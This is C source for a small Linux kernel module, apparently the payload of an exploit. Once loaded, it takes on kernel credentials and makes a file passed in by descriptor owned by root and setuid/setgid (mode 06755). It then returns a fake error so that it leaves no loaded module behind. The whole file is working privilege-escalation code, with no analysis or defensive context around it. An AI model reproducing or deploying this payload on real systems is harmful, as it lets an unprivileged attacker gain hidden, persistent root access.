#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cred.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

static int suidfile_fd = -1;
module_param(suidfile_fd, int, 0);

static int __init init_rootmod(void) {
  int (*sys_fchown_)(int fd, int uid, int gid);
  int (*sys_fchmod_)(int fd, int mode);
  const struct cred *kcred, *oldcred;

  sys_fchown_ = (void*)kallsyms_lookup_name("sys_fchown");
  sys_fchmod_ = (void*)kallsyms_lookup_name("sys_fchmod");

  printk(KERN_INFO "rootmod loading\n");
  kcred = prepare_kernel_cred(NULL);
  oldcred = override_creds(kcred);
  sys_fchown_(suidfile_fd, 0, 0);
  sys_fchmod_(suidfile_fd, 06755);
  revert_creds(oldcred);
  return -ELOOP; /* fake error because we don't actually want to end up with a loaded module */
}

static void __exit cleanup_rootmod(void) {}

module_init(init_rootmod);
module_exit(cleanup_rootmod);

MODULE_LICENSE("GPL v2");
